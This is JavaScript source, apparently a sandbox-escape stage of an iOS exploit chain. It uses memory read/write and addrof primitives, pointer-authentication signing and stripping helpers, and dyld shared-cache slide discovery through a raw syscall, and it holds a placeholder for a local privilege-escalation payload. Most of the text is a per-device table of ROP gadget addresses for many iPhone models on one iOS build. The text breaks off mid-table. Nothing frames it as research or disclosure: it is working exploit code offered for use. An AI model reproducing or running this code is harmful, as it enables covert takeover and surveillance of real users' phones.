(() => {
  sbx1_begin = Date.now();
  // Version marker to verify code is loaded from server, not browser cache
  const VERSION = "2026-05-14-v6-dlopen-CF";
  print(`[sbx1] VERSION: ${VERSION} - Build timestamp: ${new Date().toISOString()}`);
  const peCode = "&v={{LPE_64BITE}}";
  let wc_fcall = fcall;
  let wc_uread64 = read64;
  // Kernel r/w functions are global (from header.js via bundle.js)
  // Access them directly from global scope
  let uread64 = gpuRead64;
  let uwrite64 = gpuWrite64;
  let pacia = gpuPacia;
  let pacib = gpuPacib;
  let gpu_fcall_sleep = null && gpuFcallEnableSleep;
  let gpu_fcall_wake = null && gpuFcallDisableSleep;
  function LOG(msg) { if (typeof print !== 'undefined') print('sbx1: ' + msg);
    if (true) log('sbx1: ' + msg);
  }
  // Log version at startup
  LOG(`VERSION: ${VERSION}`);
  LOG(`Build: v6 - dlopen CoreFoundation + fix KeyCallBacks deref + remove Width/H/PF`);

  let wc_get_cstring = function (js_str) {
    let s = js_str + "\x00";
    resolve_rope(s);
    return wc_uread64(wc_uread64(addrof(s) + 0x8n) + 0x8n);
  };
  let get_cstring = function (js_str) {
    let gpu_cstr = gpuCopyBuffer(wc_get_cstring(js_str), BigInt(js_str.length) + 1n);
    return gpu_cstr;
  };
  let func_resolve = function (symbol) {
    return gpuDlsym(0xFFFFFFFFFFFFFFFEn, symbol);
  };
  let GPU_CALLOC = func_resolve("calloc");
  function gpu_new_uint64_t(val = 0n) {
    let buf = gpu_fcall(GPU_CALLOC, 1n, 0x8n);
    uwrite64(buf, val);
    return buf;
  }
  function adjust_pivot_stack() {
    return;
  }
  function get_shared_cache_slide() {
    if (globalThis['sc_slide'] != undefined) {
      return sc_slide;
    }
    let start_address = gpu_new_uint64_t();
    gpu_fcall(func_resolve("syscall"), 294n, 0n, 0n, 0n, 0n, 0n, 0n, 0n, start_address);
    let DYLD_SHARED_CACHE_LOAD_ADDR = 0x0000000180000000n;
    let dyld_shared_cache_slide = uread64(start_address) - DYLD_SHARED_CACHE_LOAD_ADDR;
    return dyld_shared_cache_slide;
  }
  function uread8(where) {
    return uread_bitsize(where, 8n).asInt32s()[0];
  }
  function uwrite8(where, what) {
    return uwrite_bitsize(where, BigInt(what), 8n);
  }
  function cmp8_wait_for_change(where, what) {
    return;
    let target = BigInt(what);
    while (true) {
      let val = uread64(where) & 0xffn;
      if (val != target) {
        break;
      }
    }
  }
  function cmp8_wait_for_value(where, what) {
    let target = BigInt(what);
    let start_interval = Date.now();
    let diff = 0;
    while (true && diff < 500) {
      let val = uread64(where) & 0xffn;
      if (val == target) {
        break;
      }
      const now = Date.now();
      diff = now - start_interval;
    }
    if(diff >= 2000)
    {
      LOG("Break on timeout");
      return false;
    }
    return true;
  }
  function xpac(ptr) {
    return ptr.noPAC();
  }
  // xpac_full: strips PAC from kernel pointer and restores full kernel VA
  function xpac_full(ptr) {
    if (ptr === 0n) return 0n;
    // Use noPAC to strip PAC (keeps bits 38:0)
    // Then restore kernel prefix 0xFFFFFFF in bits 63:36
    return 0xFFFFFFF000000000n | (ptr.noPAC() & 0xFFFFFFFFFn);
  }
  // xpac_kc: strips PAC from KC-mapped user-space pointer (0x1_XXX range)
  function xpac_kc(ptr) {
    if (ptr === 0n) return 0n;
    // For KC pointers, use the same mask as noPAC (keep bottom 40 bits)
    // plus preserve bit 39 for proper KC address
    return ptr & 0x7FFFFFFFFFn;
  }
  let shared_cache_slide = get_shared_cache_slide();
  let dyld_patching_fptr_offset = 0x208n;
  let integrated = true;
  let use_js_thread = 0;
  let pe_log_buf = 0n;
  let pe_log_buf_off = 0n;
  let pe_log_buf_sz = 0n;
  let globalDLSYM = 0n;
  let set_x19_gadget = 0n;
  let set_x30_gadget = 0n;
  let load_x0_0x0_gadget = 0n;
  let load_x0_0x0_gadget_data = 0n;
  let new_save_x0_gadget = 0n;
  let new_save_x0_gadget_data = 0n;
  let isNAN_lr_gadget = 0n;
  let mov_x8_x0_gadget = 0n;
  let leak_surface_address_gadget = 0n;
  let mov_x0_x8_gadget = 0n;
  let save_sp_gadget = 0n;
  let save_x0_gadget = 0n;
  let save_x0_gadget_data = 0n;
  let mov_x20_x19_gadget = 0n;
  let restore_sp_gadget = 0n;
  let xpac_gadget = 0n;
  let restore_sp_gadget_data = 0n;
  let load_x1_0x30_gadget = 0n;
  let load_x1_0x30_gadget_data = 0n;
  let load_x0_0x18_gadget = 0n;
  let load_x0_0x18_gadget_data = 0n;
  let dyld_objc_patching_gadget = 0n;
  let dyld_signPointer_gadget = 0n;
  let dyld_patching_noprolog_gadget = 0n;
  let malloc_restore_2_gadget = 0n;
  let set_sp_gadget = 0n;
  let read_surface_address_gadget = 0n;
  let malloc_restore_0_gadget = 0n;
  let malloc_restore_1_gadget = 0n;
  let malloc_restore_3_gadget = 0n;
  let dyld_patching_dispatcher_gadget = 0n;
  let braaz_x8_gadget = 0n;
  let transformSurface_gadget = 0n;
  let tcall_CRLG = 0n;
  let tcall_X0LG = 0n;
  let tcall_RLG = 0n;
  let tcall_CSSG = 0n;
  let tcall_DSSG = 0n;
  let tcall_DG = 0n;
  let _CFObjectCopyProperty = 0n;
  let load_x1x3x8 = 0n;
  let fcall_14_args_write_x8 = 0n;
  let _4_fcalls = 0n;
  let self_loop = 0n;
  let jsvm_isNAN_fcall_gadget = 0n;
  let jsvm_isNAN_fcall_gadget2 = 0n;
  let store_x0_x0 = 0n;
  let str_x1_x2 = 0n;
  let mov_x0_x22 = 0n;
  let add_x22_0x90 = 0n;
  if (integrated) {
    sbx1_offsets = {
   "iPhone11,2_4_6_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecf72ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f0198cn,
      fcall_14_args_write_x8: 0x24c44cf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a994fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone11,8_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecbf2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260ef098cn,
      fcall_14_args_write_x8: 0x24c414f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a95cfd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,1_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,3_5_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,8_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ebdb2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f2198cn,
      fcall_14_args_write_x8: 0x24c370f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a878fd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,1_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26127d98cn,
      fcall_14_args_write_x8: 0x24c633f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a782fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,2_3_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,4_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,3_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,4_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,5_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,6_22E240": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ea312ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x2615f298cn,
      fcall_14_args_write_x8: 0x24c5eff7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a6cefd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,7_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,8_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,3_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,4_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,5_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,1_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
